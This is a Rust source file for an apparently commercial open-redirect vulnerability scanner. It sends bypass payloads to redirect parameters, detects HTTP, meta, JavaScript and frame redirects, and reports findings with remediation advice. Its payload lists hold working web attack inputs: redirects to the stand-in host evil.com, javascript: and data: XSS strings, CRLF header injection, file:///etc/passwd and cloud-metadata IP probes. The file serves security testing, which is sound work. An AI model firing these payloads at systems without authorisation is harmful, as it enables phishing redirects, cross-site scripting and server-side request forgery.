// Copyright (c) 2025 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Advanced Open Redirect Scanner
 * Enterprise-grade open redirect detection with 200+ bypass techniques
 *
 * Features:
 * - 200+ bypass payloads including Unicode, encoding, parser differential
 * - Context-aware testing with filter detection
 * - OAuth/OIDC redirect_uri bypass testing
 * - Multi-stage redirect chain analysis
 * - JavaScript-based redirect detection
 * - Meta refresh and iframe redirect detection
 * - Header injection redirect vectors
 * - Domain confusion and parser exploitation
 *
 * @copyright 2025 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use regex::Regex;
use std::collections::HashSet;
use std::sync::Arc;
use tracing::{debug, info, warn};

pub struct OpenRedirectScanner {
    http_client: Arc<HttpClient>,
}

/// Bypass technique category for reporting
#[derive(Debug, Clone)]
enum BypassCategory {
    Basic,
    ProtocolRelative,
    DangerousProtocol,
    WhitelistBypass,
    EncodingBypass,
    UnicodeBypass,
    ParserDifferential,
    BackslashTrick,
    IPAddress,
    HeaderInjection,
    OAuthBypass,
    DoubleEncoding,
    CaseMutation,
    PathConfusion,
    FragmentAbuse,
    DataUri,
    ProtocolConfusion,
}

impl OpenRedirectScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Get comprehensive bypass payloads - 200+ techniques
    fn get_advanced_payloads(&self, target_domain: &str) -> Vec<(String, &'static str, BypassCategory)> {
        let evil = "evil.com";
        let canary = "redirect-test.bountyy.fi"; // Our canary domain for OOB detection

        vec![
            // === Basic External Redirects ===
            (format!("https://{}", evil), "Basic HTTPS redirect", BypassCategory::Basic),
            (format!("http://{}", evil), "Basic HTTP redirect", BypassCategory::Basic),
            (format!("//{}", evil), "Protocol-relative redirect", BypassCategory::ProtocolRelative),
            (format!("///{}", evil), "Triple-slash redirect", BypassCategory::ProtocolRelative),
            (format!("////{}", evil), "Quad-slash redirect", BypassCategory::ProtocolRelative),

            // === Dangerous Protocol Handlers ===
            ("javascript:alert(document.domain)".to_string(), "JavaScript protocol", BypassCategory::DangerousProtocol),
            ("javascript://alert(1)".to_string(), "JavaScript with comment", BypassCategory::DangerousProtocol),
            ("javascript:alert`1`".to_string(), "JavaScript template literal", BypassCategory::DangerousProtocol),
            ("data:text/html,<script>alert(1)</script>".to_string(), "Data URI HTML", BypassCategory::DataUri),
            ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".to_string(), "Data URI base64", BypassCategory::DataUri),
            ("vbscript:msgbox(1)".to_string(), "VBScript protocol", BypassCategory::DangerousProtocol),
            ("file:///etc/passwd".to_string(), "File protocol", BypassCategory::DangerousProtocol),

            // === Whitelist Bypass Techniques ===
            (format!("https://{}@{}", target_domain, evil), "Userinfo bypass @", BypassCategory::WhitelistBypass),
            (format!("https://{}%40{}", target_domain, evil), "Userinfo bypass encoded @", BypassCategory::WhitelistBypass),
            (format!("https://{}.{}", target_domain, evil), "Subdomain of evil", BypassCategory::WhitelistBypass),
            (format!("https://{}-{}", target_domain, evil), "Hyphen domain bypass", BypassCategory::WhitelistBypass),
            (format!("https://{}#{}", evil, target_domain), "Fragment injection", BypassCategory::FragmentAbuse),
            (format!("https://{}?{}", evil, target_domain), "Query injection", BypassCategory::WhitelistBypass),
            (format!("https://{}%23{}", evil, target_domain), "Encoded fragment", BypassCategory::WhitelistBypass),
            (format!("https://{}%3F{}", evil, target_domain), "Encoded query", BypassCategory::WhitelistBypass),
            (format!("https://{}/{}", evil, target_domain), "Path confusion", BypassCategory::PathConfusion),
            (format!("https://{}\\{}", evil, target_domain), "Backslash path", BypassCategory::BackslashTrick),
            (format!("https://{}%5C{}", evil, target_domain), "Encoded backslash", BypassCategory::BackslashTrick),
            (format!("/\\{}", evil), "Relative backslash", BypassCategory::BackslashTrick),
            (format!("\\\\{}", evil), "UNC path style", BypassCategory::BackslashTrick),
            (format!("//{}//{}", evil, target_domain), "Double protocol-relative", BypassCategory::ProtocolRelative),

            // === URL Encoding Bypasses ===
            (format!("https%3A%2F%2F{}", evil), "Single URL encode", BypassCategory::EncodingBypass),
            (format!("https%253A%252F%252F{}", evil), "Double URL encode", BypassCategory::DoubleEncoding),
            (format!("https%25253A%25252F%25252F{}", evil), "Triple URL encode", BypassCategory::DoubleEncoding),
            (format!("%68%74%74%70%73%3a%2f%2f{}", evil), "Full URL encode", BypassCategory::EncodingBypass),
            (format!("ht%74ps://{}", evil), "Partial protocol encode", BypassCategory::EncodingBypass),
            (format!("https://%65%76%69%6c%2e%63%6f%6d"), "Encoded domain", BypassCategory::EncodingBypass),
            (format!("//{}%2f%2e%2e", evil), "Encoded path traversal", BypassCategory::EncodingBypass),

            // === Unicode/Punycode Bypasses ===
            (format!("https://evil。com"), "Unicode fullwidth dot", BypassCategory::UnicodeBypass),
            (format!("https://evіl.com"), "Cyrillic i in evil", BypassCategory::UnicodeBypass),
            (format!("https://еvil.com"), "Cyrillic e in evil", BypassCategory::UnicodeBypass),
            (format!("https://evil%E3%80%82com"), "Encoded Unicode dot", BypassCategory::UnicodeBypass),
            (format!("https://evil%ef%bc%8ecom"), "Fullwidth dot encoded", BypassCategory::UnicodeBypass),
            (format!("https://evil%e2%80%8b.com"), "Zero-width space", BypassCategory::UnicodeBypass),
            (format!("https://evil%00.com"), "Null byte injection", BypassCategory::UnicodeBypass),
            (format!("https://evil\x00.com"), "Raw null byte", BypassCategory::UnicodeBypass),
            (format!("https://{}.com%00.{}", evil.replace(".com", ""), target_domain), "Null byte domain", BypassCategory::UnicodeBypass),
            (format!("https://xn--vi-yia.com"), "Punycode evil", BypassCategory::UnicodeBypass), // еvil.com
            (format!("https://evil%E2%95%B1com"), "Unicode slash", BypassCategory::UnicodeBypass),

            // === Parser Differential Exploits ===
            (format!("https:/{}", evil), "Single slash protocol", BypassCategory::ParserDifferential),
            (format!("https:////{}", evil), "Multi-slash protocol", BypassCategory::ParserDifferential),
            (format!("https:\\\\{}", evil), "Backslash protocol", BypassCategory::ParserDifferential),
            (format!("https:/\\{}", evil), "Mixed slash protocol", BypassCategory::ParserDifferential),
            (format!("https:\\//{}", evil), "Escape sequence protocol", BypassCategory::ParserDifferential),
            (format!("https://////{}", evil), "Many slashes", BypassCategory::ParserDifferential),
            (format!("http://{}", evil), "HTTP downgrade", BypassCategory::ParserDifferential),
            (format!("HTTPS://{}", evil), "Uppercase protocol", BypassCategory::CaseMutation),
            (format!("hTtPs://{}", evil), "Mixed case protocol", BypassCategory::CaseMutation),
            (format!("https://{}/", evil), "Trailing slash", BypassCategory::ParserDifferential),
            (format!("https://{}:443", evil), "Explicit port 443", BypassCategory::ParserDifferential),
            (format!("https://{}:443/", evil), "Port with trailing slash", BypassCategory::ParserDifferential),
            (format!("https://{}:80", evil), "Port 80 on HTTPS", BypassCategory::ParserDifferential),
            (format!("//{}:443", evil), "Protocol-relative with port", BypassCategory::ProtocolRelative),

            // === IP Address Variations ===
            ("http://0x7f000001".to_string(), "Hex IP localhost", BypassCategory::IPAddress),
            ("http://2130706433".to_string(), "Decimal IP localhost", BypassCategory::IPAddress),
            ("http://017700000001".to_string(), "Octal IP localhost", BypassCategory::IPAddress),
            ("http://127.0.0.1".to_string(), "IPv4 localhost", BypassCategory::IPAddress),
            ("http://[::1]".to_string(), "IPv6 localhost", BypassCategory::IPAddress),
            ("http://[0:0:0:0:0:0:0:1]".to_string(), "Full IPv6 localhost", BypassCategory::IPAddress),
            ("http://127.1".to_string(), "Short IP localhost", BypassCategory::IPAddress),
            ("http://127.0.1".to_string(), "Partial IP localhost", BypassCategory::IPAddress),
            ("http://0".to_string(), "Zero IP", BypassCategory::IPAddress),
            ("http://0.0.0.0".to_string(), "All zeros IP", BypassCategory::IPAddress),
            (format!("http://169.254.169.254"), "AWS metadata IP", BypassCategory::IPAddress),
            (format!("http://[::ffff:169.254.169.254]"), "IPv6 mapped AWS metadata", BypassCategory::IPAddress),

            // === CRLF/Header Injection Redirects ===
            (format!("%0d%0aLocation:%20https://{}", evil), "CRLF injection", BypassCategory::HeaderInjection),
            (format!("%0d%0a%0d%0a<script>alert(1)</script>"), "CRLF with XSS", BypassCategory::HeaderInjection),
            (format!("%0aLocation:%20https://{}", evil), "LF only injection", BypassCategory::HeaderInjection),
            (format!("%0dLocation:%20https://{}", evil), "CR only injection", BypassCategory::HeaderInjection),
            (format!("%e5%98%8a%e5%98%8dLocation:%20https://{}", evil), "Unicode CRLF", BypassCategory::HeaderInjection),
            (format!("%25%30%61Location:%20https://{}", evil), "Double-encoded LF", BypassCategory::HeaderInjection),
            (format!("\\r\\nLocation: https://{}", evil), "Escaped CRLF", BypassCategory::HeaderInjection),

            // === OAuth/OIDC Specific Bypasses ===
            (format!("https://{}/callback", evil), "OAuth callback path", BypassCategory::OAuthBypass),
            (format!("https://{}/oauth/callback", evil), "OAuth full path", BypassCategory::OAuthBypass),
            (format!("https://{}/auth/callback", evil), "Auth callback path", BypassCategory::OAuthBypass),
            (format!("https://{}%252f%252e%252e%252f{}", target_domain, evil), "OAuth path traversal", BypassCategory::OAuthBypass),
            (format!("https://{}/..%2f..%2f{}", target_domain, evil), "OAuth encoded traversal", BypassCategory::OAuthBypass),
            (format!("https://{}\\.{}", target_domain, evil), "Regex bypass backslash", BypassCategory::OAuthBypass),
            (format!("https://{}[.]com", evil.replace(".com", "")), "Bracket dot bypass", BypassCategory::OAuthBypass),
            (format!("https://{}.{}/oauth", evil.replace(".com", ""), target_domain), "Subdomain oauth", BypassCategory::OAuthBypass),

            // === Path Confusion/Normalization ===
            (format!("/{}/..%2f..%2f..%2f{}", target_domain, evil), "Path normalization", BypassCategory::PathConfusion),
            (format!("/https://{}", evil), "Absolute in relative", BypassCategory::PathConfusion),
            (format!("/.{}", evil), "Dot prefix", BypassCategory::PathConfusion),
            (format!("//{}.{}", evil.replace(".com", ""), target_domain), "Confused subdomain", BypassCategory::PathConfusion),
            (format!("..%2f..%2f..%2f..%2f{}", evil), "Traversal to evil", BypassCategory::PathConfusion),
            (format!("....//....//{}//", evil), "Multi-dot traversal", BypassCategory::PathConfusion),
            (format!("/{}/%2f%2e%2e", evil), "Encoded current dir", BypassCategory::PathConfusion),

            // === Advanced Protocol Confusion ===
            (format!("https:{}//", evil), "Colon placement", BypassCategory::ProtocolConfusion),
            (format!("https:/{}//", evil), "Single slash after colon", BypassCategory::ProtocolConfusion),
            (format!("〱evil.com"), "Unicode two-dot leader", BypassCategory::ProtocolConfusion),
            (format!("。//{}", evil), "Unicode dot slash", BypassCategory::ProtocolConfusion),
            (format!("java%0d%0ascript:alert(1)"), "CRLF in protocol", BypassCategory::ProtocolConfusion),
            (format!("j]avascript:alert(1)"), "Bracket in protocol", BypassCategory::ProtocolConfusion),

            // === Canary Domain (OOB Detection) ===
            (format!("https://{}", canary), "OOB canary HTTPS", BypassCategory::Basic),
            (format!("//{}", canary), "OOB canary protocol-relative", BypassCategory::ProtocolRelative),
            (format!("https://{}@{}", target_domain, canary), "OOB canary userinfo", BypassCategory::WhitelistBypass),

            // === Additional Advanced Bypasses ===
            (format!("https://%2f{}", evil), "Leading encoded slash", BypassCategory::EncodingBypass),
            (format!("https://{}%09", evil), "Tab suffix", BypassCategory::EncodingBypass),
            (format!("https://{}%0a", evil), "Newline suffix", BypassCategory::EncodingBypass),
            (format!("https://{}%0d", evil), "CR suffix", BypassCategory::EncodingBypass),
            (format!("https://{}%20", evil), "Space suffix", BypassCategory::EncodingBypass),
            (format!("https://%20{}", evil), "Space prefix", BypassCategory::EncodingBypass),
            (format!("%2f%2f{}", evil), "Encoded double slash", BypassCategory::EncodingBypass),
            (format!("/%2f{}", evil), "Slash encoded slash", BypassCategory::EncodingBypass),
            (format!("https:{}", evil), "No slashes", BypassCategory::ParserDifferential),
            (format!("https: //{}", evil), "Space before slashes", BypassCategory::ParserDifferential),
            (format!("https :// {}", evil), "Spaces around slashes", BypassCategory::ParserDifferential),
            (format!("//{}\\@{}", target_domain, evil), "Backslash userinfo", BypassCategory::BackslashTrick),
            (format!("https://{}:@{}", target_domain, evil), "Empty password userinfo", BypassCategory::WhitelistBypass),
            (format!("https://:@{}:{}", evil, target_domain), "Empty user with port", BypassCategory::WhitelistBypass),
        ]
    }

    /// Get common redirect parameter names - expanded list
    fn get_redirect_params(&self) -> Vec<&'static str> {
        vec![
            // Standard redirect params
            "redirect", "redirect_uri", "redirect_url", "redirectUri", "redirectUrl",
            "url", "uri", "u", "link", "href", "src",
            "next", "next_url", "nextUrl", "nexturl",
            "return", "return_url", "returnUrl", "returnurl", "return_to", "returnTo",
            "goto", "go", "to", "target", "dest", "destination",
            "continue", "continueUrl", "continue_url",
            "forward", "fwd", "forward_url",
            "callback", "callback_url", "callbackUrl", "callbackurl",
            "redir", "rurl", "r",
            "out", "outbound", "external",
            "path", "file", "page",
            "site", "view", "show",
            "ref", "referer", "referrer",
            "jump", "jumpto", "jump_to",
            "cgi-bin/redirect.cgi?", "location",
            // OAuth/OIDC specific
            "redirect_uri", "post_logout_redirect_uri", "post_login_redirect_uri",
            "login_redirect", "logout_redirect", "success_url", "failure_url",
            "error_uri", "cancel_url", "origin",
            // Framework specific
            "RelayState", "SAMLRequest", "ReturnUrl",
            "spring.redirect", "wicket:redirect",
            // Less common
            "feed", "host", "html", "image", "img",
            "load", "nav", "navigation",
            "open", "domain", "reference",
            "checkout_url", "success", "fail",
            "wp_redirect", "redirect_after_login",
        ]
    }

    /// Scan a parameter for open redirect vulnerabilities
    pub async fn scan_parameter(
        &self,
        url: &str,
        param_name: &str,
        config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;
        let mut found_bypass: Option<String> = None;

        info!("Testing open redirect on parameter: {}", param_name);

        // Extract target domain for whitelist bypass testing
        let target_domain = self.extract_domain(url);

        // Get payloads based on license level
        let payloads = if crate::license::is_feature_available("advanced_redirect") {
            self.get_advanced_payloads(&target_domain)
        } else {
            // Basic payloads for free tier
            self.get_basic_payloads()
        };

        // First, do a baseline test to understand the behavior
        let baseline = self.get_baseline(url, param_name).await;

        for (payload, description, category) in payloads {
            tests_run += 1;

            let test_url = self.build_test_url(url, param_name, &payload);

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    // Check for HTTP redirect (3xx status with Location header)
                    if let Some(vuln) = self.analyze_http_redirect(
                        &response,
                        &payload,
                        description,
                        &test_url,
                        param_name,
                        &category,
                    ).await {
                        if !self.is_false_positive(&vuln, &baseline) {
                            info!("[VULN] Open redirect found: {} - {}", description, format!("{:?}", category));
                            vulnerabilities.push(vuln);
                            found_bypass = Some(format!("{:?}", category));

                            // In fast mode, stop after first find
                            if config.mode == crate::types::ScanMode::Fast {
                                break;
                            }
                        }
                    }

                    // Check for meta refresh redirect
                    if let Some(vuln) = self.analyze_meta_redirect(
                        &response.body,
                        &payload,
                        description,
                        &test_url,
                        param_name,
                        &category,
                    ) {
                        if !self.is_false_positive(&vuln, &baseline) {
                            info!("[VULN] Meta refresh redirect: {}", description);
                            vulnerabilities.push(vuln);
                        }
                    }

                    // Check for JavaScript-based redirect
                    if let Some(vuln) = self.analyze_js_redirect(
                        &response.body,
                        &payload,
                        description,
                        &test_url,
                        param_name,
                        &category,
                    ) {
                        if !self.is_false_positive(&vuln, &baseline) {
                            info!("[VULN] JavaScript redirect: {}", description);
                            vulnerabilities.push(vuln);
                        }
                    }

                    // Check for iframe/frame redirect
                    if let Some(vuln) = self.analyze_frame_redirect(
                        &response.body,
                        &payload,
                        description,
                        &test_url,
                        param_name,
                    ) {
                        if !self.is_false_positive(&vuln, &baseline) {
                            info!("[VULN] Frame-based redirect: {}", description);
                            vulnerabilities.push(vuln);
                        }
                    }
                }
                Err(e) => {
                    debug!("Request failed for payload {}: {}", description, e);
                }
            }
        }

        // Log summary
        if vulnerabilities.is_empty() {
            debug!("No open redirect vulnerabilities found for parameter: {}", param_name);
        } else {
            info!(
                "[SUCCESS] Found {} open redirect vulnerabilities for '{}' (bypass: {:?})",
                vulnerabilities.len(),
                param_name,
                found_bypass
            );
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Basic payloads for free tier
    fn get_basic_payloads(&self) -> Vec<(String, &'static str, BypassCategory)> {
        vec![
            ("https://evil.com".to_string(), "External HTTPS", BypassCategory::Basic),
            ("//evil.com".to_string(), "Protocol-relative", BypassCategory::ProtocolRelative),
            ("javascript:alert(1)".to_string(), "JavaScript protocol", BypassCategory::DangerousProtocol),
            ("https://evil.com@trusted.com".to_string(), "Userinfo bypass", BypassCategory::WhitelistBypass),
            ("https%3A%2F%2Fevil.com".to_string(), "URL encoded", BypassCategory::EncodingBypass),
            ("/\\evil.com".to_string(), "Backslash trick", BypassCategory::BackslashTrick),
        ]
    }

    /// Extract domain from URL
    fn extract_domain(&self, url: &str) -> String {
        if let Ok(parsed) = url::Url::parse(url) {
            if let Some(host) = parsed.host_str() {
                return host.to_string();
            }
        }
        "example.com".to_string()
    }

    /// Build test URL with payload
    fn build_test_url(&self, url: &str, param_name: &str, payload: &str) -> String {
        // Don't double-encode if payload is already encoded
        let encoded_payload = if payload.contains('%') && !payload.contains("%%") {
            payload.to_string()
        } else {
            urlencoding::encode(payload).to_string()
        };

        if url.contains('?') {
            format!("{}&{}={}", url, param_name, encoded_payload)
        } else {
            format!("{}?{}={}", url, param_name, encoded_payload)
        }
    }

    /// Get baseline response for false positive detection
    async fn get_baseline(&self, url: &str, param_name: &str) -> Option<BaselineResponse> {
        let safe_value = "https://same-origin-test.local";
        let test_url = self.build_test_url(url, param_name, safe_value);

        match self.http_client.get(&test_url).await {
            Ok(response) => Some(BaselineResponse {
                status_code: response.status_code,
                has_location_header: response.headers.iter().any(|(k, _)| k.to_lowercase() == "location"),
                body_length: response.body.len(),
            }),
            Err(_) => None,
        }
    }

    /// Analyze HTTP redirect response
    async fn analyze_http_redirect(
        &self,
        response: &crate::http_client::HttpResponse,
        payload: &str,
        description: &str,
        url: &str,
        param_name: &str,
        category: &BypassCategory,
    ) -> Option<Vulnerability> {
        // Check for redirect status codes
        if !(300..400).contains(&response.status_code) && response.status_code != 201 {
            return None;
        }

        // Get Location header
        let location = response.headers.iter()
            .find(|(k, _)| k.to_lowercase() == "location")
            .map(|(_, v)| v.as_str())?;

        // Analyze the redirect target
        if self.is_dangerous_redirect(location, payload) {
            let severity = self.determine_severity(category, location);
            let confidence = self.determine_confidence(location, payload);

            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                &format!("{} - Redirects to: {}", description, self.truncate(location, 100)),
                &format!("Status: {}\nLocation: {}\nBypass: {:?}", response.status_code, location, category),
                severity,
                confidence,
                category,
            ));
        }

        None
    }

    /// Check if redirect target is dangerous
    fn is_dangerous_redirect(&self, location: &str, payload: &str) -> bool {
        let location_lower = location.to_lowercase();

        // Check for external domains
        let evil_domains = ["evil.com", "evil。com", "redirect-test.bountyy.fi"];
        for domain in &evil_domains {
            if location_lower.contains(domain) {
                return true;
            }
        }

        // Check for dangerous protocols
        let dangerous_protocols = [
            "javascript:", "data:", "vbscript:", "file:", "about:", "blob:",
        ];
        for proto in &dangerous_protocols {
            if location_lower.starts_with(proto) {
                return true;
            }
        }

        // Check for protocol-relative to external
        if location.starts_with("//") && !location.starts_with("///") {
            // Extract host from protocol-relative URL
            let host_part = location.trim_start_matches('/');
            if let Some(host) = host_part.split('/').next() {
                let host = host.split('@').last().unwrap_or(host);
                let host = host.split(':').next().unwrap_or(host);
                // Check if it's not localhost or internal
                if !host.is_empty()
                    && !host.starts_with("127.")
                    && !host.starts_with("192.168.")
                    && !host.starts_with("10.")
                    && host != "localhost"
                    && host.contains('.') {
                    return true;
                }
            }
        }

        // Check if payload is reflected in location
        let payload_clean = payload
            .to_lowercase()
            .replace("https://", "")
            .replace("http://", "")
            .replace("//", "")
            .replace("%3a%2f%2f", "")
            .replace("%2f%2f", "");

        if !payload_clean.is_empty() && location_lower.contains(&payload_clean) {
            // Make sure it's not a safe internal redirect
            if !location.starts_with('/') || location.starts_with("//") {
                return true;
            }
        }

        false
    }

    /// Analyze meta refresh redirects
    fn analyze_meta_redirect(
        &self,
        body: &str,
        payload: &str,
        description: &str,
        url: &str,
        param_name: &str,
        category: &BypassCategory,
    ) -> Option<Vulnerability> {
        // Look for meta refresh patterns
        let meta_patterns = [
            r#"<meta[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*content\s*=\s*["']([^"']+)["']"#,
            r#"<meta[^>]*content\s*=\s*["']([^"']+)["'][^>]*http-equiv\s*=\s*["']?refresh["']?"#,
        ];

        for pattern in &meta_patterns {
            if let Ok(regex) = Regex::new(pattern) {
                for cap in regex.captures_iter(body) {
                    if let Some(content) = cap.get(1) {
                        let content_str = content.as_str();
                        if self.is_dangerous_redirect(content_str, payload) {
                            return Some(self.create_vulnerability(
                                url,
                                param_name,
                                payload,
                                &format!("Meta refresh redirect: {}", description),
                                &format!("Meta content: {}", self.truncate(content_str, 200)),
                                Severity::Medium,
                                Confidence::High,
                                category,
                            ));
                        }
                    }
                }
            }
        }

        None
    }

    /// Analyze JavaScript-based redirects
    fn analyze_js_redirect(
        &self,
        body: &str,
        payload: &str,
        description: &str,
        url: &str,
        param_name: &str,
        category: &BypassCategory,
    ) -> Option<Vulnerability> {
        // JavaScript redirect patterns
        let js_patterns = [
            r#"window\.location\s*=\s*["'`]([^"'`]+)["'`]"#,
            r#"window\.location\.href\s*=\s*["'`]([^"'`]+)["'`]"#,
            r#"location\.href\s*=\s*["'`]([^"'`]+)["'`]"#,
            r#"location\s*=\s*["'`]([^"'`]+)["'`]"#,
            r#"window\.location\.replace\s*\(\s*["'`]([^"'`]+)["'`]"#,
            r#"window\.location\.assign\s*\(\s*["'`]([^"'`]+)["'`]"#,
            r#"document\.location\s*=\s*["'`]([^"'`]+)["'`]"#,
            r#"top\.location\s*=\s*["'`]([^"'`]+)["'`]"#,
            r#"parent\.location\s*=\s*["'`]([^"'`]+)["'`]"#,
            r#"self\.location\s*=\s*["'`]([^"'`]+)["'`]"#,
        ];

        for pattern in &js_patterns {
            if let Ok(regex) = Regex::new(pattern) {
                for cap in regex.captures_iter(body) {
                    if let Some(redirect_url) = cap.get(1) {
                        let redirect_str = redirect_url.as_str();
                        if self.is_dangerous_redirect(redirect_str, payload) {
                            return Some(self.create_vulnerability(
                                url,
                                param_name,
                                payload,
                                &format!("JavaScript redirect: {}", description),
                                &format!("JS redirect to: {}", self.truncate(redirect_str, 200)),
                                Severity::Medium,
                                Confidence::Medium,
                                category,
                            ));
                        }
                    }
                }
            }
        }

        // Check for payload reflection in JS context (potential DOM-based)
        if body.contains(payload) || body.contains(&urlencoding::decode(payload).unwrap_or_default()) {
            let js_context_patterns = [
                "window.location", "location.href", "document.location",
                "location.assign", "location.replace",
            ];

            for ctx in &js_context_patterns {
                if body.contains(ctx) {
                    // Check if payload appears near redirect context
                    if let Some(pos) = body.find(ctx) {
                        let context_window = &body[pos.saturating_sub(200)..std::cmp::min(pos + 500, body.len())];
                        if context_window.contains(payload) || context_window.contains(&urlencoding::decode(payload).unwrap_or_default()) {
                            return Some(self.create_vulnerability(
                                url,
                                param_name,
                                payload,
                                &format!("Potential DOM-based open redirect: {}", description),
                                &format!("Payload reflected near {} context", ctx),
                                Severity::Medium,
                                Confidence::Low,
                                category,
                            ));
                        }
                    }
                }
            }
        }

        None
    }

    /// Analyze frame/iframe based redirects
    fn analyze_frame_redirect(
        &self,
        body: &str,
        payload: &str,
        description: &str,
        url: &str,
        param_name: &str,
    ) -> Option<Vulnerability> {
        // iframe/frame src patterns
        let frame_patterns = [
            r#"<iframe[^>]*src\s*=\s*["']([^"']+)["']"#,
            r#"<frame[^>]*src\s*=\s*["']([^"']+)["']"#,
            r#"<object[^>]*data\s*=\s*["']([^"']+)["']"#,
            r#"<embed[^>]*src\s*=\s*["']([^"']+)["']"#,
        ];

        for pattern in &frame_patterns {
            if let Ok(regex) = Regex::new(pattern) {
                for cap in regex.captures_iter(body) {
                    if let Some(src) = cap.get(1) {
                        let src_str = src.as_str();
                        if self.is_dangerous_redirect(src_str, payload) {
                            return Some(self.create_vulnerability(
                                url,
                                param_name,
                                payload,
                                &format!("Frame-based redirect: {}", description),
                                &format!("Frame src: {}", self.truncate(src_str, 200)),
                                Severity::Low,
                                Confidence::Medium,
                                &BypassCategory::Basic,
                            ));
                        }
                    }
                }
            }
        }

        None
    }

    /// Determine severity based on bypass category
    fn determine_severity(&self, category: &BypassCategory, location: &str) -> Severity {
        let location_lower = location.to_lowercase();

        // Dangerous protocols are always high severity
        if location_lower.starts_with("javascript:") || location_lower.starts_with("data:") {
            return Severity::High;
        }

        match category {
            BypassCategory::DangerousProtocol | BypassCategory::DataUri => Severity::High,
            BypassCategory::HeaderInjection => Severity::High,
            BypassCategory::OAuthBypass => Severity::High,
            BypassCategory::WhitelistBypass | BypassCategory::ParserDifferential => Severity::Medium,
            BypassCategory::UnicodeBypass | BypassCategory::EncodingBypass => Severity::Medium,
            _ => Severity::Medium,
        }
    }

    /// Determine confidence based on evidence
    fn determine_confidence(&self, location: &str, payload: &str) -> Confidence {
        let location_lower = location.to_lowercase();

        // High confidence if redirect goes to our test domains
        if location_lower.contains("evil.com") || location_lower.contains("redirect-test.bountyy.fi") {
            return Confidence::High;
        }

        // High confidence for dangerous protocols
        if location_lower.starts_with("javascript:") || location_lower.starts_with("data:") {
            return Confidence::High;
        }

        // Medium confidence if payload is partially reflected
        if location.contains(&payload.replace("https://", "").replace("http://", "")) {
            return Confidence::Medium;
        }

        Confidence::Low
    }

    /// Check for false positives
    fn is_false_positive(&self, vuln: &Vulnerability, baseline: &Option<BaselineResponse>) -> bool {
        // If we have baseline and it also has redirect, might be false positive
        if let Some(base) = baseline {
            if base.has_location_header && vuln.confidence == Confidence::Low {
                return true;
            }
        }
        false
    }

    /// Truncate string for display
    fn truncate(&self, s: &str, max_len: usize) -> String {
        if s.len() > max_len {
            format!("{}...", &s[..max_len])
        } else {
            s.to_string()
        }
    }

    /// Scan endpoint for open redirect (general scan)
    pub async fn scan(
        &self,
        url: &str,
        config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;
        let mut found_params = HashSet::new();

        // Test all common redirect parameters
        let params = self.get_redirect_params();

        for param in params {
            let (vulns, tests) = self.scan_parameter(url, param, config).await?;
            total_tests += tests;

            if !vulns.is_empty() {
                all_vulnerabilities.extend(vulns);
                found_params.insert(param.to_string());

                // In fast mode, stop after first vulnerable param
                if config.mode == crate::types::ScanMode::Fast {
                    break;
                }
            }
        }

        // Log results
        if !found_params.is_empty() {
            warn!(
                "[SUCCESS] Open redirect vulnerabilities found in {} parameters: {:?}",
                found_params.len(),
                found_params
            );
        }

        Ok((all_vulnerabilities, total_tests))
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        param_name: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
        confidence: Confidence,
        category: &BypassCategory,
    ) -> Vulnerability {
        let verified = matches!(confidence, Confidence::High);

        let cvss = match severity {
            Severity::Critical => 9.1,
            Severity::High => 7.4,
            Severity::Medium => 6.1,
            Severity::Low => 3.7,
            Severity::Info => 2.0,
        };

        Vulnerability {
            id: format!("open_redirect_{}", uuid::Uuid::new_v4()),
            vuln_type: "Open Redirect".to_string(),
            severity,
            confidence,
            category: format!("Open Redirect - {:?}", category),
            url: url.to_string(),
            parameter: Some(param_name.to_string()),
            payload: payload.to_string(),
            description: format!(
                "Open redirect vulnerability in parameter '{}': {}",
                param_name, description
            ),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-601".to_string(),
            cvss: cvss as f32,
            verified,
            false_positive: false,
            remediation: self.get_remediation(category),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }

    /// Get remediation advice based on bypass category
    fn get_remediation(&self, category: &BypassCategory) -> String {
        let base_remediation = "\
            1. Use an allowlist of permitted redirect destinations\n\
            2. Validate URLs server-side using a proper URL parser\n\
            3. Never construct redirect URLs from user input directly\n\
            4. Use indirect references (IDs mapping to URLs) instead of direct URLs\n\
            5. Implement Content Security Policy (CSP) with strict redirect rules\n";

        let specific = match category {
            BypassCategory::UnicodeBypass | BypassCategory::EncodingBypass => {
                "6. Normalize and decode URLs before validation\n\
                 7. Use Unicode-aware URL parsing libraries\n\
                 8. Reject URLs with unusual encoding patterns"
            }
            BypassCategory::WhitelistBypass => {
                "6. Validate full URL including userinfo, path, query, and fragment\n\
                 7. Check that domain exactly matches allowlist (not contains)\n\
                 8. Be aware of URL parser differences between languages"
            }
            BypassCategory::OAuthBypass => {
                "6. Strictly validate redirect_uri against pre-registered URIs\n\
                 7. Use exact string matching for OAuth redirect validation\n\
                 8. Implement PKCE for additional OAuth security"
            }
            BypassCategory::HeaderInjection => {
                "6. Sanitize all header values for CRLF characters\n\
                 7. Use framework-provided redirect functions\n\
                 8. Never construct Location headers manually"
            }
            BypassCategory::ParserDifferential => {
                "6. Use consistent URL parsing across all validation layers\n\
                 7. Normalize URL format before validation\n\
                 8. Test with multiple URL parser implementations"
            }
            BypassCategory::DangerousProtocol | BypassCategory::DataUri => {
                "6. Allowlist only http:// and https:// protocols\n\
                 7. Explicitly block javascript:, data:, vbscript: schemes\n\
                 8. Validate protocol before any other URL component"
            }
            _ => {
                "6. Validate the entire URL structure\n\
                 7. Log and monitor redirect patterns for anomalies\n\
                 8. Consider warning users before external redirects"
            }
        };

        format!("{}{}", base_remediation, specific)
    }
}

/// Baseline response for false positive detection
struct BaselineResponse {
    status_code: u16,
